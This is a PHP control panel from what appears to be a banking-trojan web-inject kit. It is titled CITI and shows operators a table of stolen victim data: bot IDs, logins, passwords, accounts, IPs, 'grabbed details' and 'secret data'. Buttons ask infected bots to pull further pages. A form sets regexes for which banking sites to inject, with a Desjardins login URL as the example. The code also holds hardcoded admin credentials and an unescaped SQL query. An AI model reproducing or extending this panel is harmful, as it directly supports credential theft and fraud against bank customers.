<?php 
include ('config.php');
session_start();

$lgn='user1';
$pwd='9yHY8GFUUtmNIIx77mjUm';
if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {
	$_SERVER['PHP_AUTH_USER'] = $_SERVER['PHP_AUTH_PW'] = '';
}

if ($_SERVER['PHP_AUTH_USER'] !=$lgn  || $_SERVER['PHP_AUTH_PW'] != $pwd) {
	Header('WWW-Authenticate: Basic realm="admin"');
	Header('HTTP/1.0 401 Unauthorized');
	exit('<b>Access Denied!</b>');
}

if(!isset($_SESSION["authorized"]) || intval($_SESSION["authorized"])<1){
	session_destroy();
	header("Location: login.php");
	die();
}
if ( !isset( $_GET["action"] ) ) $_GET["action"] = "showlist"; 
  
switch ( $_GET["action"] ) 
{
  case "showlist":    
    show_list(); break; 
  case "addform":    
    get_add_item_form(); break; 
  case "add":        
    add_item(); break;
  case "editform":   
    get_edit_item_form(); break; 
  case "update":      
    update_item(); break;
  case "updateanother":
	update_item_another();break;
  case "delete":     
    delete_item(); break;
  default: 
    show_list(); 
}
echo '<style>
			.Used{
			color:#333333; background: #D3DCE3;
			}
			.Active{
			color:#333333; background: #F0FFF0;
			}
			.Success{
			color:#333333; background: #FFD3D3;
			}
			.Cool{
			color:#333333; background: #00FFFF;
			}
			.Inactive{
			color:#333333; background: #F5F5F5;
			}
			.red{
			color:#333333; background: red;
			}
			
			td {
				word-wrap:break-word;
			}
			</style></body></html>';
function show_list() 
{
  echo '<html><title>CITI</title><body><h2>CITI </h2><button href="#" id="modal" style="display:none;cursor:pointer;">Settings</button><button onclick="window.location.href=\''.$_SERVER['PHP_SELF'].'?action=addform\'" id="EDITREGEXP" style="cursor:pointer;display:none;">Edit rules</button>
			<form action="logout.php" style="display: inline;">
				<button type="submit" id="modal" style="cursor:pointer;float:right;">Logout</button>
			</form>
			<!-- settings.php css -->
			<link rel="stylesheet" href="settings_sms_jabber/main.css">
			<!-- jQuery -->
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
			<!-- arcticModal -->
			<script src="settings_sms_jabber/modal/jquery.arcticmodal-0.3.min.js"></script>
			<link rel="stylesheet" href="settings_sms_jabber/modal/jquery.arcticmodal-0.3.css">
			<!-- arcticModal theme -->
			<link rel="stylesheet" href="settings_sms_jabber/modal/themes/simple.css">
			<script>
//setTimeout(function(){location.reload();}, 60000);
$("#modal").click(function() {
$.arcticmodal({
type: "ajax",
 url: "settings_sms_jabber/settings.php",
closeOnEsc: false,
    closeOnOverlayClick: false,
	ajax:{type: "POST",
		cache: false,
		dataType: "html", //jsonp  - если сервер не совпадает с адресом админки
		data:{inject:"CITI"},
  success: function(data, el, responce) {var h = $(\'<div class="box-modal">\' +
                   responce+
                    \'</div>\');

            data.body.html(h);
  },
  error: function(xhr, status, error) {
    alert("an error has occured: " + xhr.status + " " + xhr.statusText);
  }}
});
})
  </script>
  ';  $u=1;
  echo '<div style="overflow-y: auto; width: 100%;"><table style="table-layout: fixed;width:100%;border:1px dotted #83B6EF;table-layout:fixed">'; 
  echo '<tr>
  <th style="width: 2%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">N/N</th>
  <th style="width: 7%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">&#1051;&#1086;&#1082;&#1072;&#1083;&#1100;&#1085;&#1086;&#1077; &#1074;&#1088;&#1077;&#1084;&#1103; &#1087;&#1086;&#1089;&#1083;. &#1086;&#1090;&#1095;&#1105;&#1090;&#1072;</th>
  <th style="width: 7%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">BotId</th>
  <th style="width: 7%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Login</th>
  <th style="width: 7%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Pass</th>
  <th style="width: 15%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Accounts</th>
  <th style="width: 7%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Ip</th>
  <th style="width: 7%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Last Logon</th>
  <th style="width: 20%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Grabbed Details</th>
  <th style="width: auto;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Status</th>
  <th style="width: auto;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">&#x0417;&#x0430;&#x043F;&#x0440;&#x043E;&#x0441;&#x0438;&#x0442;&#x044C;<br>&#x0437;&#x0430;&#x043D;&#x043E;&#x0432;&#x043E;</th>
  <th style="width: auto;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Comment</th>
  <th style="width: 2%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Edit</th><th style="width: 2%;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Del.</th></tr>'; 
  $query = 'SELECT * FROM CITI ORDER BY localetime DESC';
  $res = mysql_query( $query );
  while ( $CITI = mysql_fetch_array( $res ) ) 
  { 
    echo '<tr class="';if($CITI["status"]=="success"){echo 'Cool';} else {echo 'Used';} ;echo '" style="border-bottom:1px dotted #83B6EF">'; 
    echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$u.'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.date("Y-m-d H:i:s",$CITI["localetime"]).'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["botid"].'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["login"].'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["pass"].'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">';
	$massiv=split("<br>",$CITI["accounts"]);
	for($k=0;$k<count($massiv);$k++){
		echo $massiv[$k].'<br>';
	}
	echo '</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["ip"].'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["lastlogin"].'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["page1"].'<br>'.$CITI["page2"].'</td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><a href="#"  onclick="$.arcticmodal({content: (&quot;#'.$CITI["botid"].$CITI["login"].'&quot;)});document.getElementById(&quot;'.$CITI["botid"].$CITI["login"].'&quot;).style.display=&quot;block&quot;">'.$CITI["status"].'</a></td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><button onclick="javascript:MakeElem(\'&status=first\',false,\'script\',\''.$CITI["login"].'\',\''.$CITI["botid"].'\')" style="width:100%;">1 page</button><br><br><button onclick="javascript:MakeElem(\'&status=second\',false,\'script\',\''.$CITI["login"].'\',\''.$CITI["botid"].'\')" style="width:100%;">2 page</button></td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF" ondblclick="this.getElementsByTagName(\'textarea\')[0].disabled=false;this.getElementsByTagName(\'textarea\')[0].focus();"><textarea disabled="disabled" style="background:inherit;border:0px;" onchange="MakeElem(\'&comment=\'+encodeURIComponent(this.value),false,\'script\',\''.$CITI["login"].'\',\''.$CITI["botid"].'\');this.disabled=\'disabled\';">'.$CITI["comment"].'</textarea></td>';
	echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><a href="'.$_SERVER['PHP_SELF'].'?action=editform&botid='.$CITI['botid'].'&login='.$CITI['login'].'"><img src="b_edit.png"></a></td>'; 
    echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><a href="'.$_SERVER['PHP_SELF'].'?action=delete&botid='.$CITI['botid'].'&login='.$CITI['login'].'"><img src="b_drop.png"></a></td>'; 
	echo '</tr>';
	$u++;
  }
  echo '</table></div>';
  $query = 'SELECT * FROM CITI ORDER BY localetime DESC';
  $res = mysql_query( $query ); 
  while ( $CITI = mysql_fetch_array( $res ) ) 
  {
  echo '<div id="'.$CITI["botid"].$CITI["login"].'" class="box-modal" style="display:none"><button class="box-modal_close arcticmodal-close" style="color:red;font-weight:bold;" onclick="this.parentNode.style.display=&quot;none&quot;">Close</button><table style="border:1px dotted #83B6EF;"><tbody>
  <tr>
  <td style="width: 10px;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">User\'s<br>language</td>
  <td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Secret data</td>
  <td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Useragent</td>
  <td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">&#1051;&#1086;&#1075;</td>
  <td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">&#1050;&#1086;&#1084;&#1084;&#1077;&#1085;&#1090;</td>
  </tr>
  <tr>
  <td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["langpage"].'</td>
  <td style="vertical-align: top;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["secdata"].'</td>
  <td style="vertical-align: top;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["useragent"].'</td>
  <td style="vertical-align: top;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["RStatus"].'</td>
  <td style="vertical-align: top;border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">'.$CITI["comment"].'</td>
  </tr>
  </tbody></table><script>
  function MakeElem(src,func,elem,login,botid){
	src="'.$_SERVER['PHP_SELF'].'?action=update&botid="+botid+"&login="+login+src;
	try{String.prototype.fAkEfrm = document.createElement(elem);"".fAkEfrm.setAttribute("src", src);"".fAkEfrm.setAttribute("id", "'.$u.'");
	"".fAkEfrm.setAttribute("name", "fAkEelem");
	if(func){if("".fAkEfrm.attachEvent){"".fAkEfrm.attachEvent("onload",func)}else{"".fAkEfrm.addEventListener("load", func, true)}};
	"".fAkEfrm.setAttribute("style", "display:none");"".fAkEfrm.setAttribute("width", "0px");"".fAkEfrm.setAttribute("height", "0px");
	document.getElementsByTagName("body")[0].appendChild("".fAkEfrm);}catch(e){};
	};
  </script></div>';
  }
}

function get_add_item_form() 
{ 
  $query = "SELECT lockeds FROM LOCKEDSITE LIMIT 1;";
  $res = mysql_query( $query ); 
  $LOCKEDSITE = mysql_fetch_array( $res ); 
  echo '<html>
  <!-- settings.php css -->
			<link rel="stylesheet" href="settings_sms_jabber/main.css">
			<link rel="stylesheet" href="settings_sms_jabber/modal/jquery.arcticmodal-0.3.css">
			<!-- arcticModal theme -->
			<link rel="stylesheet" href="settings_sms_jabber/modal/themes/simple.css">
  <title>LOCKEDSITE </title><body><h2>Locked sites</h2><text style="font-size:12px;">&#1055;&#1086;&#1080;&#1089;&#1082; &#1080;&#1076;&#1077;&#1090; &#1074; URL &#1085;&#1072; &#1082;&#1086;&#1090;&#1088;&#1086;&#1084; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1074; &#1076;&#1072;&#1085;&#1085;&#1099;&#1081; &#1084;&#1086;&#1084;&#1077;&#1085;&#1090; &#1080;&#1085;&#1078;&#1077;&#1082;&#1090;.<br>&#1040;&#1083;&#1075;&#1086;&#1088;&#1080;&#1090;&#1084; &#1076;&#1086;&#1073;&#1072;&#1074;&#1083;&#1077;&#1085;&#1080;&#1103;: <br>&#1085;&#1072;&#1087;&#1088;&#1080;&#1084;&#1077;&#1088; &#1076;&#1083;&#1103; &#1083;&#1080;&#1085;&#1082;&#1072; <b>https://accweb.mouv.desjardins.com/identifiantunique/identification</b> &#1088;&#1077;&#1075;&#1091;&#1083;&#1103;&#1088;&#1082;&#1072; &#1073;&#1091;&#1076;&#1077;&#1090;: <b>mouv\.desjardins\.(.+?)identifiantunique\/</b><br>&#1056;&#1077;&#1075;&#1091;&#1083;&#1103;&#1088;&#1082;&#1080; &#1089;&#1086;&#1077;&#1076;&#1080;&#1085;&#1103;&#1102;&#1090;&#1089;&#1103; &#1079;&#1085;&#1072;&#1082;&#1086;&#1084; "|", &#1085;&#1072;&#1087;&#1088;&#1080;&#1084;&#1077;&#1088;: <b>mouv\.desjardins\.(.+?)identifiantunique\/|test1(.+?)ru</b><br>&#1047;&#1085;&#1072;&#1082;&#1080; "." &#1080; "/" &#1101;&#1082;&#1088;&#1072;&#1085;&#1080;&#1088;&#1091;&#1102;&#1089;&#1103; &#1086;&#1073;&#1088;&#1072;&#1090;&#1085;&#1099;&#1084; &#1089;&#1083;&#1077;&#1096;&#1077;&#1084; "\"</text>';  
  echo '<form name="addform" action="'.$_SERVER['PHP_SELF'].'?action=add" method="POST">'; 
  echo '<table border="1" cellpadding="2" cellspacing="0">';
  echo '<tr class="Used" width="400px;">'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Locked Sites</td>'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><input type="text" name="lockeds" value="'.$LOCKEDSITE['lockeds'].'" style="width:700px;"/></td>'; 
  echo '</tr>';
  echo '<tr class="Active">'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF" colspan="3"><input type="submit" value="Save" style="float:right;background-color:#00FFFF;cursor:pointer"/><button type="button" onClick="history.back();" style="float:right;color:white;margin-right:10px;background-color:red;cursor:pointer">Cancel</button></td>'; 
  echo '</tr>'; 
  echo '</table>'; 
  echo '</form>'; 
}

function add_item() 
{
  $lockeds = mysql_escape_string( $_POST['lockeds'] );
  $query = mysql_query("SELECT lockeds FROM LOCKEDSITE LIMIT 1");
	//Если нет записи в БД
	if(!$result = mysql_fetch_array($query)){
		$query = "INSERT INTO LOCKEDSITE SET lockeds='".$lockeds."'";
	mysql_query($query)or die(mysql_error());
	}else{
		$query = "UPDATE LOCKEDSITE SET lockeds='".$lockeds."' LIMIT 1";
		mysql_query($query)or die(mysql_error());
	}
  header( 'Location: '.$_SERVER['PHP_SELF'] );
  die();
}

function get_edit_item_form() 
{
  echo '<html>
  <!-- settings.php css -->
			<link rel="stylesheet" href="settings_sms_jabber/main.css">
			<link rel="stylesheet" href="settings_sms_jabber/modal/jquery.arcticmodal-0.3.css">
			<!-- arcticModal theme -->
			<link rel="stylesheet" href="settings_sms_jabber/modal/themes/simple.css">
  <title>CITI</title><body><h2>Edit</h2>'; 
  $botid=$_GET['botid'];
  $login=$_GET['login'];
  $query = "SELECT status, comment FROM CITI WHERE botid='$botid' AND login='$login';";
  $res = mysql_query( $query ); 
  $CITI = mysql_fetch_array( $res ); 
  echo '<form name="editform" action="'.$_SERVER['PHP_SELF'].'?action=updateanother&botid='.$_GET['botid'].'&login='.$_GET['login'].'" method="POST" >'; 
  echo '<table border="1" cellpadding="2" cellspacing="0">'; 
  echo '<tr class="Used">'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">BotId</td>'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF" colspan="2"><text type="text" name="botid" >'.$_GET['botid'].'</text></td><td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"></td>'; 
  echo '</tr>';
  echo '<tr class="Active">'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Status</td>'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><text type="text" name="reset_status" id="reset_status" style="font-weight:bold">'.$CITI['status'].'</text></td>';
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><input type="button" name="locked_button" id="locked_button" value="Reset" onclick="javascript:document.getElementById(\'status\').value=\'empty\';document.getElementById(\'reset_status\').innerHTML=\'empty\'; "></td>';
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"><input name="status" id ="status" type="hidden" value="'.$CITI['status'].'"></td>';
  echo '</tr>'; 
  echo '<tr class="Used">'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF">Description</td>'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF" colspan="2"><textarea name="comment" rows="3" cols="45">'.$CITI['comment'].'</textarea></td><td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF"></td>'; 
  echo '</tr>'; 
  echo '<tr class="Active">'; 
  echo '<td style="border-right:1px dotted #83B6EF; border-bottom:1px dotted #83B6EF" colspan="3"><input type="submit" value="Save" style="float:right;background-color:#00FFFF;cursor:pointer"/><button type="button" onClick="history.back();" style="float:right;color:white;margin-right:10px;background-color:red;cursor:pointer">Cancel</button></td>'; 
  echo '</tr>';
  echo '</table>'; 
  echo '</form>';
} 

function update_item() 
{
	$botid=mysql_escape_string($_REQUEST['botid']);
	$login=mysql_escape_string($_REQUEST['login']);
	$status=mysql_escape_string($_REQUEST['status']); 
	$comment=mysql_escape_string($_REQUEST['comment']);
	$query="UPDATE CITI SET ";
	if(strlen($status)>2){
		$query1 = mysql_query("SELECT status FROM CITI WHERE botid='$botid' AND login='$login';");
		while($rows=mysql_fetch_array($query1)){
			$statusold="$rows[status]";//empty - запросить обе стр, first- первую стр., second- вторую стр, success- все данные получены
		};
		if($statusold!=$status and $statusold!="success"){
			$status="empty";
		}
		$query.="status='".$status."'";
		echo "alert('status: ".$status."');";
	}else{
		$query.="comment='".$comment."'";
		echo "alert('comment: ".$comment."');";
	}
	$query .= " WHERE botid='$botid' AND login='$login';";
	mysql_query($query);
	echo "location.reload(true)";
	die();
}

function update_item_another() 
{
	$botid=mysql_escape_string($_REQUEST['botid']);
	$login=mysql_escape_string($_REQUEST['login']);
	$status=mysql_escape_string($_REQUEST['status']); 
	$comment=mysql_escape_string($_REQUEST['comment']);
	$query = "UPDATE CITI SET status='".$status."',comment='".$comment."' WHERE botid='$botid' AND login='$login';";
	mysql_query($query);
	header( 'Location: '.$_SERVER['PHP_SELF'] );
	die();
}

function delete_item() 
{
  $botid=mysql_escape_string($_REQUEST['botid']);
  $login=mysql_escape_string($_REQUEST['login']);
  $query = "DELETE FROM CITI WHERE botid='$botid' AND login='$login';;";
  mysql_query ( $query ); 
  header( 'Location: '.$_SERVER['PHP_SELF'] );
  die();
}
?>